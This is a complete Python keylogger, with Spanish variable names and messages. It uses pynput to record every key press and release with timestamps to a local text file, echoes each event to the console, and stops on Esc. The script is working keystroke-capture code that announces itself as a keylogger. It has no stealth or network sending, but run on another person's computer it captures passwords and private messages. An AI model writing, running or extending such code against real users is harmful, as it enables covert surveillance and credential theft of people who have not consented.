from datetime import datetime
from pynput.keyboard import Key, Listener

contador_evento = 1
nombre_archivo = "registro_teclado.txt"

def registrar_evento(tipo_accion, detalle_tecla):
    global contador_evento
    marca_tiempo = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
    id_evento = f"evento_{contador_evento:03d}"
    linea_registro = f"{marca_tiempo} | {tipo_accion} | {id_evento} | {detalle_tecla}\n"
    with open(nombre_archivo, "a", encoding="utf-8") as archivo:
        archivo.write(linea_registro)
    contador_evento += 1
    print(linea_registro.strip())

def on_press(key):
    try:
        detalle = f"PRESS: {key.char}"
    except AttributeError:
        detalle = f"PRESS: {key}"
    
    registrar_evento("PRESS", detalle)

def on_release(key):
    try:
        detalle = f"RELEASE: {key.char}"
    except AttributeError:
        detalle = f"RELEASE: {key}"
        
    registrar_evento("RELEASE", detalle)
    
    if key == Key.esc:
        print("\n[!] Saliendo del programa y guardando registros...")
        return False

print(f"[*] Keylogger iniciado. Los datos se guardarán en '{nombre_archivo}'.")
print("[*] Presiona 'Esc' para detener la ejecución.\n")

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()